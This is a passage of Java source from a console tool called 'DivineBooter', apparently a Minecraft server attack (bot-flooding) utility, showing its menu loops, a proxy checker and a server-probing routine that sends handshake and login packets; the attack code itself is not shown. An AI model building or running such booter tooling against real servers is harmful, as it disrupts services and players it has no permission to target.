    public static void defaultThemeAttackManager() {
        String select = "";

        while(true) {
            ColorsUtils.setColor("cyan");
            System.out.println("DivineBooter");
            ColorsUtils.setColor("red");
            System.out.print("> ");

            try {
                try {
                    select = bufferedReader.readLine();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                if (select.equalsIgnoreCase("attack")) { defaultThemeAttack(); }
                if (select.equalsIgnoreCase("custom")) { CustomCommandManager.manager(); }
                if (select.equalsIgnoreCase("divinecustom")) { DivineCommandManager.interpreterManager(); }
                if (select.equalsIgnoreCase("obama")) {
                    System.out.println("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠉⠉⠉⠋⠛⠛⠛⠻⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠄⠄⠄⠄⠄⠄⠄⠂⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠹⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⢻⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⢠⠄⠄⡀⠄⠄⢀⠂⠄⠄⠄⠄⠄⠄⠄⠄⠄⡁⠄⠄⢛⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⡈⢔⠸⣐⢕⢕⢵⢰⢱⢰⢐⢤⡡⡢⣕⢄⢢⢠⠄⠄⠄⠄⠄⠄⠙⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡁⠂⠅⢕⠌⡎⡎⣎⢎⢮⢮⣳⡳⣝⢮⢺⢜⢕⢕⢍⢎⠪⡐⠄⠁⠄⠸⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⠏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠄⠄⢅⠣⡡⡣⣣⡳⡵⣝⡮⣗⣗⡯⣗⣟⡮⡮⣳⣣⣳⢱⢱⠱⣐⠄⠂⠄⢿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠂⠄⠄⠄⠄⠄⠄⢂⢈⠢⡱⡱⡝⣮⣿⣟⣿⣽⣷⣿⣯⣿⣷⣿⣿⣿⣾⣯⣗⡕⡇⡇⠄⠂⡀⢹⣿\n" +
                            "⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⠄⠂⠄⠄⠄⠄⠄⠄⠐⢀⢂⢕⢸⢨⢪⢳⡫⣟⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡺⡮⡣⡣⠠⢂⠒⢸⣿\n" +
                            "⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠐⠄⡂⠆⡇⣗⣝⢮⢾⣻⣞⣿⣿⣿⣿⣿⣿⣿⣿⢿⣽⣯⡯⣺⢸⢘⠨⠔⡅⢨⣿\n" +
                            "⣿⣿⠋⠉⠙⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠁⠄⠄⠄⡂⡪⡪⡪⡮⡮⡯⣻⣽⣾⣿⣿⣿⣟⣿⣿⣿⣽⣿⣿⡯⣯⡺⡸⡰⡱⢐⡅⣼⣿\n" +
                            "⣿⠡⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠈⠆⠱⠑⠝⠜⠕⡝⡝⣞⢯⢿⣿⣿⡿⣟⣿⣿⣿⡿⡿⣽⣷⣽⡸⡨⡪⣂⠊⣿⣿\n" +
                            "⣿⠡⠄⡨⣢⠐⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠍⡓⣗⡽⣝⠽⠍⠅⠑⠁⠉⠘⠘⠘⠵⡑⢜⢀⢀⢉⢽\n" +
                            "⣿⠁⠠⢱⢘⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠈⠱⣁⠜⡘⠌⠄⠄⡪⣳⣟⡮⢅⠤⠠⠄⠄⣀⣀⡀⡀⠄⠈⡂⢲⡪⡠⣿\n" +
                            "⣿⡇⠨⣺⢐⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡀⠄⠄⠄⠤⡠⡢⢒⠦⠠⠄⠄⠄⡸⢽⣟⢮⠢⡂⡐⠄⡈⡀⠤⡀⠄⠑⢄⠨⢸⡺⣐⣿\n" +
                            "⣿⣿⠈⠕⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡂⡪⡐⡥⢤⣰⣰⣰⡴⡮⠢⠂⠄⠄⡊⢮⢺⢕⢵⢥⡬⣌⣒⡚⣔⢚⢌⢨⢚⠌⣾⡪⣾⣿\n" +
                            "⣿⣿⣆⠄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡑⢕⢕⡯⡷⣕⢧⢓⢭⠨⡀⠄⡂⠨⡨⣪⡳⣝⢝⡽⣻⣻⣞⢽⣲⢳⢱⢡⠱⠨⣟⢺⣿⣿\n" +
                            "⣿⣿⣿⡆⠄⡅⠇⡄⠄⠄⠄⠄⠄⠄⠄⠐⠨⢪⢹⢽⢽⣺⢝⠉⠁⠁⠄⠄⠄⢌⢎⡖⡯⡎⡗⢝⠜⣶⣯⣻⢮⡻⣟⣳⡕⠅⣷⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣶⣶⣿⣷⠄⠄⠄⠄⠄⠄⠄⠄⠈⠔⡑⠕⠝⠄⡀⠄⠄⠊⢆⠂⠨⡪⣺⣮⣿⡾⡜⣜⡜⣄⠙⢞⣿⢿⡿⣗⢝⢸⣾⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⡀⠄⠄⠄⠄⢀⠄⠠⠄⠠⠄⠄⠄⠄⠄⠄⠊⠺⡹⠳⡙⡜⡓⡭⡺⡀⠄⠣⡻⡹⡸⠨⣣⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠠⠄⠄⣂⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢄⠤⡤⡄⡆⡯⡢⡣⡣⡓⢕⠽⣄⠄⠨⡂⢌⣼⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠈⠆⠄⠸⡂⠄⠄⠄⢀⠄⢀⠈⠄⠂⠁⠙⠝⠼⠭⠣⠣⠣⠑⠌⠢⠣⡣⡠⡘⣰⣱⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⢑⠄⠈⡱⠄⢘⠄⡀⠨⢐⣧⣳⣷⣶⣦⣤⣴⣶⣶⣶⡶⠄⡠⡢⡕⣜⠎⡮⣣⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠢⠄⠨⠄⠄⠣⡀⠄⢀⢀⢙⠃⡿⢿⠿⡿⡿⢟⢋⢔⡱⣝⢜⡜⡪⡪⣵⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⡁⠄⠄⠄⠄⠄⠄⠄⠅⠄⠡⠄⠄⠡⢀⢂⠢⡡⠡⠣⡑⣏⢯⡻⡳⣹⡺⡪⢎⠎⡆⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣇⠄⠄⠄⠄⠄⠄⠄⠐⠄⠄⠁⠄⢈⠄⢂⠕⡕⡝⢕⢎⢎⢮⢎⢯⢺⢸⢬⠣⢃⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠨⡐⠌⢆⢇⢧⢭⣣⡳⣵⢫⣳⢱⠱⢑⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠁⡊⢌⢢⢡⢣⢪⡺⡪⡎⡎⡎⡚⣨⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠕⡅⢗⢕⡳⡭⣳⢕⠕⡱⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠌⠄⠑⠩⢈⢂⣱⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡀⢄⠄⣀⠄⡀⣀⢠⢄⣖⣖⣞⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣱⡐⡕⡕⡽⣝⣟⣮⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣽⣸⣃⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿");
                }
                else if (select.equalsIgnoreCase("proxychecker")) {
                    String fileName;

                    ColorsUtils.setColor("cyan");
                    System.out.print("\nType proxies' file name: ");
                    ColorsUtils.setColor("red");
                    fileName = bufferedReader.readLine();

                    checkProxy(fileName);
                } else if (select.equalsIgnoreCase("help")) {
                    System.out.println("\nHelp: displays this page.");
                    System.out.println("Proxychecker: checks if proxies (without port because it checks the host) are working.");
                    System.out.println("Getinfo: gets info about a minecraft server.");
                    System.out.println("Attack: attacks.\n");
                } else if (select.equalsIgnoreCase("getinfo")) {
                    String host = new String();
                    int port;

                    ColorsUtils.setColor("cyan");
                    System.out.print("Type server's IP: ");
                    ColorsUtils.setColor("red");
                    host = bufferedReader.readLine();

                    ColorsUtils.setColor("cyan");
                    System.out.print("Type server's port: ");
                    ColorsUtils.setColor("red");
                    port = Integer.parseInt(bufferedReader.readLine());
                    System.out.println("");

                    String serverStatus = StatusManager.serverStatus(host, port);
                    JSONParser jsonParser = new JSONParser();
                    JSONObject jsonObject = (JSONObject) jsonParser.parse(serverStatus);

                    Socket socket = new Socket();
                    InetSocketAddress inetSocketAddress = new InetSocketAddress(host, port);
                    socket.connect(inetSocketAddress);

                    DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
                    DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());

                    PacketSetCompression packetSetCompression = new PacketSetCompression();

                    JSONObject version = (JSONObject) jsonObject.get("version");
                    long protocol = (long) version.get("protocol");

                    JSONObject playersManager = (JSONObject) jsonObject.get("players");
                    long maxPlayers = (long) playersManager.get("max");
                    long onlinePlayers = (long) playersManager.get("online");
                    //long samplePlayers = (long) playersManager.get("sample");

                    ColorsUtils.setColor("cyan");
                    System.out.print("IP Host: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(host);

                    ColorsUtils.setColor("cyan");
                    System.out.print("Numerical IP: ");
                    ColorsUtils.setColor("yellow");
                    InetSocketAddress inetSocketAddress1 = new InetSocketAddress(host, port);

                    if (inetSocketAddress1.getAddress().toString().contains(host)) {
                        String[] complexHost = inetSocketAddress1.getAddress().toString().split("/");
                        String numericalHost = complexHost[1];
                        System.out.println(numericalHost);
                    }

                    //System.out.println(inetSocketAddress1.getAddress());

                    ColorsUtils.setColor("cyan");
                    System.out.print("Port: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(port);

                    ColorsUtils.setColor("cyan");
                    System.out.print("Protocol: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(protocol);

                    ColorsUtils.setColor("cyan");
                    System.out.print("Online players: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(onlinePlayers);

                    ColorsUtils.setColor("cyan");
                    System.out.print("Max players: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(maxPlayers);

                    HandshakePacket packetHandshake = new HandshakePacket((int) protocol, host, port, NextState.LOGIN);
                    packetHandshake.sendPacket(dataOutputStream);

                    Thread.sleep(250);

                    LoginStart packetLoginStart = new LoginStart("moonl1ght01");
                    packetLoginStart.sendPacket(dataOutputStream);

                    int id = DataTypes.readVarInt(dataInputStream);

                    ColorsUtils.setColor("cyan");
                    System.out.print("Premium: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(id == 0x03 ? "No." : "Yes.");
                    System.out.println("");
                    //System.out.println("Players' names (note that this will be empty if server doesn't have this feature): " + samplePlayers);
                }
                else { System.err.println("Unknown command! Type \"help\" for a list of commands."); }
            } catch (InputMismatchException | InterruptedException | ParseException e) {
                System.err.println("You have to insert a string for the IP and");
                System.err.println("an integer number for the port!");
            } catch (ConnectException e) {
                System.err.println("\n[DivineError] Server is offline\n");
            } catch (NullPointerException e) {
                System.err.print("");
            } catch (SocketException e) {
                System.err.println("[DivineError] Server is lagging too much, bots can't join!");
            } catch (UnknownHostException e) {
                System.err.println("\n[DivineError] Server doesn't exist.\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static void colorblindThemeAttackManager() {
        String select = "";

        while(true) {
            ColorsUtils.setColor("yellow");
            System.out.println("DivineBooter");
            ColorsUtils.setColor("cyan");
            System.out.print("> ");

            try {
                try {
                    select = bufferedReader.readLine();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                if (select.equalsIgnoreCase("attack")) { colorblindThemeAttack(); }
                if (select.equalsIgnoreCase("obama")) {
                    System.out.println("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠉⠉⠉⠋⠛⠛⠛⠻⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠄⠄⠄⠄⠄⠄⠄⠂⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠹⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⢻⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⢠⠄⠄⡀⠄⠄⢀⠂⠄⠄⠄⠄⠄⠄⠄⠄⠄⡁⠄⠄⢛⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⡈⢔⠸⣐⢕⢕⢵⢰⢱⢰⢐⢤⡡⡢⣕⢄⢢⢠⠄⠄⠄⠄⠄⠄⠙⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡁⠂⠅⢕⠌⡎⡎⣎⢎⢮⢮⣳⡳⣝⢮⢺⢜⢕⢕⢍⢎⠪⡐⠄⠁⠄⠸⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⠏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠄⠄⢅⠣⡡⡣⣣⡳⡵⣝⡮⣗⣗⡯⣗⣟⡮⡮⣳⣣⣳⢱⢱⠱⣐⠄⠂⠄⢿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠄⠂⠄⠄⠄⠄⠄⠄⢂⢈⠢⡱⡱⡝⣮⣿⣟⣿⣽⣷⣿⣯⣿⣷⣿⣿⣿⣾⣯⣗⡕⡇⡇⠄⠂⡀⢹⣿\n" +
                            "⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⠄⠂⠄⠄⠄⠄⠄⠄⠐⢀⢂⢕⢸⢨⢪⢳⡫⣟⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡺⡮⡣⡣⠠⢂⠒⢸⣿\n" +
                            "⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠐⠄⡂⠆⡇⣗⣝⢮⢾⣻⣞⣿⣿⣿⣿⣿⣿⣿⣿⢿⣽⣯⡯⣺⢸⢘⠨⠔⡅⢨⣿\n" +
                            "⣿⣿⠋⠉⠙⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠁⠄⠄⠄⡂⡪⡪⡪⡮⡮⡯⣻⣽⣾⣿⣿⣿⣟⣿⣿⣿⣽⣿⣿⡯⣯⡺⡸⡰⡱⢐⡅⣼⣿\n" +
                            "⣿⠡⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠈⠆⠱⠑⠝⠜⠕⡝⡝⣞⢯⢿⣿⣿⡿⣟⣿⣿⣿⡿⡿⣽⣷⣽⡸⡨⡪⣂⠊⣿⣿\n" +
                            "⣿⠡⠄⡨⣢⠐⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠍⡓⣗⡽⣝⠽⠍⠅⠑⠁⠉⠘⠘⠘⠵⡑⢜⢀⢀⢉⢽\n" +
                            "⣿⠁⠠⢱⢘⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠈⠱⣁⠜⡘⠌⠄⠄⡪⣳⣟⡮⢅⠤⠠⠄⠄⣀⣀⡀⡀⠄⠈⡂⢲⡪⡠⣿\n" +
                            "⣿⡇⠨⣺⢐⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡀⠄⠄⠄⠤⡠⡢⢒⠦⠠⠄⠄⠄⡸⢽⣟⢮⠢⡂⡐⠄⡈⡀⠤⡀⠄⠑⢄⠨⢸⡺⣐⣿\n" +
                            "⣿⣿⠈⠕⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡂⡪⡐⡥⢤⣰⣰⣰⡴⡮⠢⠂⠄⠄⡊⢮⢺⢕⢵⢥⡬⣌⣒⡚⣔⢚⢌⢨⢚⠌⣾⡪⣾⣿\n" +
                            "⣿⣿⣆⠄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡑⢕⢕⡯⡷⣕⢧⢓⢭⠨⡀⠄⡂⠨⡨⣪⡳⣝⢝⡽⣻⣻⣞⢽⣲⢳⢱⢡⠱⠨⣟⢺⣿⣿\n" +
                            "⣿⣿⣿⡆⠄⡅⠇⡄⠄⠄⠄⠄⠄⠄⠄⠐⠨⢪⢹⢽⢽⣺⢝⠉⠁⠁⠄⠄⠄⢌⢎⡖⡯⡎⡗⢝⠜⣶⣯⣻⢮⡻⣟⣳⡕⠅⣷⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣶⣶⣿⣷⠄⠄⠄⠄⠄⠄⠄⠄⠈⠔⡑⠕⠝⠄⡀⠄⠄⠊⢆⠂⠨⡪⣺⣮⣿⡾⡜⣜⡜⣄⠙⢞⣿⢿⡿⣗⢝⢸⣾⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⡀⠄⠄⠄⠄⢀⠄⠠⠄⠠⠄⠄⠄⠄⠄⠄⠊⠺⡹⠳⡙⡜⡓⡭⡺⡀⠄⠣⡻⡹⡸⠨⣣⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠠⠄⠄⣂⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢄⠤⡤⡄⡆⡯⡢⡣⡣⡓⢕⠽⣄⠄⠨⡂⢌⣼⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠈⠆⠄⠸⡂⠄⠄⠄⢀⠄⢀⠈⠄⠂⠁⠙⠝⠼⠭⠣⠣⠣⠑⠌⠢⠣⡣⡠⡘⣰⣱⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⢑⠄⠈⡱⠄⢘⠄⡀⠨⢐⣧⣳⣷⣶⣦⣤⣴⣶⣶⣶⡶⠄⡠⡢⡕⣜⠎⡮⣣⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠢⠄⠨⠄⠄⠣⡀⠄⢀⢀⢙⠃⡿⢿⠿⡿⡿⢟⢋⢔⡱⣝⢜⡜⡪⡪⣵⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⡁⠄⠄⠄⠄⠄⠄⠄⠅⠄⠡⠄⠄⠡⢀⢂⠢⡡⠡⠣⡑⣏⢯⡻⡳⣹⡺⡪⢎⠎⡆⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣇⠄⠄⠄⠄⠄⠄⠄⠐⠄⠄⠁⠄⢈⠄⢂⠕⡕⡝⢕⢎⢎⢮⢎⢯⢺⢸⢬⠣⢃⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠨⡐⠌⢆⢇⢧⢭⣣⡳⣵⢫⣳⢱⠱⢑⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠁⡊⢌⢢⢡⢣⢪⡺⡪⡎⡎⡎⡚⣨⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠕⡅⢗⢕⡳⡭⣳⢕⠕⡱⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠌⠄⠑⠩⢈⢂⣱⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡀⢄⠄⣀⠄⡀⣀⢠⢄⣖⣖⣞⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣱⡐⡕⡕⡽⣝⣟⣮⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
                            "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣽⣸⣃⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿");
                }
                else if (select.equalsIgnoreCase("proxychecker")) {
                    String fileName;

                    ColorsUtils.setColor("yellow");
                    System.out.print("\nType proxies' file name: ");
                    ColorsUtils.setColor("cyan");
                    fileName = bufferedReader.readLine();

                    checkProxy(fileName);
                } else if (select.equalsIgnoreCase("help")) {
                    System.out.println("\nHelp: displays this page.");
                    System.out.println("Proxychecker: checks if proxies (without port because it checks the host) are working.");
                    System.out.println("Getinfo: gets info about a minecraft server.");
                    System.out.println("Attack: attacks.\n");
                } else if (select.equalsIgnoreCase("getinfo")) {
                    String host = new String();
                    int port;

                    ColorsUtils.setColor("yellow");
                    System.out.print("Type server's IP: ");
                    ColorsUtils.setColor("cyan");
                    host = bufferedReader.readLine();

                    ColorsUtils.setColor("yellow");
                    System.out.print("Type server's port: ");
                    ColorsUtils.setColor("cyan");
                    port = Integer.parseInt(bufferedReader.readLine());
                    System.out.println("");

                    String serverStatus = StatusManager.serverStatus(host, port);
                    JSONParser jsonParser = new JSONParser();
                    JSONObject jsonObject = (JSONObject) jsonParser.parse(serverStatus);

                    Socket socket = new Socket();
                    InetSocketAddress inetSocketAddress = new InetSocketAddress(host, port);
                    socket.connect(inetSocketAddress);

                    DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
                    DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());

                    PacketSetCompression packetSetCompression = new PacketSetCompression();

                    JSONObject version = (JSONObject) jsonObject.get("version");
                    long protocol = (long) version.get("protocol");

                    JSONObject playersManager = (JSONObject) jsonObject.get("players");
                    long maxPlayers = (long) playersManager.get("max");
                    long onlinePlayers = (long) playersManager.get("online");
                    //long samplePlayers = (long) playersManager.get("sample");

                    ColorsUtils.setColor("yellow");
                    System.out.print("IP Host: ");
                    ColorsUtils.setColor("red");
                    System.out.println(host);

                    ColorsUtils.setColor("yellow");
                    System.out.print("Numerical IP: ");
                    ColorsUtils.setColor("red");
                    InetSocketAddress inetSocketAddress1 = new InetSocketAddress(host, port);

                    if (inetSocketAddress1.getAddress().toString().contains(host)) {
                        String[] complexHost = inetSocketAddress1.getAddress().toString().split("/");
                        String numericalHost = complexHost[1];
                        System.out.println(numericalHost);
                    }

                    //System.out.println(inetSocketAddress1.getAddress());

                    ColorsUtils.setColor("yellow");
                    System.out.print("Port: ");
                    ColorsUtils.setColor("red");
                    System.out.println(port);

                    ColorsUtils.setColor("yellow");
                    System.out.print("Protocol: ");
                    ColorsUtils.setColor("red");
                    System.out.println(protocol);

                    ColorsUtils.setColor("yellow");
                    System.out.print("Online players: ");
                    ColorsUtils.setColor("red");
                    System.out.println(onlinePlayers);

                    ColorsUtils.setColor("yellow");
                    System.out.print("Max players: ");
                    ColorsUtils.setColor("red");
                    System.out.println(maxPlayers);

                    HandshakePacket packetHandshake = new HandshakePacket((int) protocol, host, port, NextState.LOGIN);
                    packetHandshake.sendPacket(dataOutputStream);

                    Thread.sleep(250);

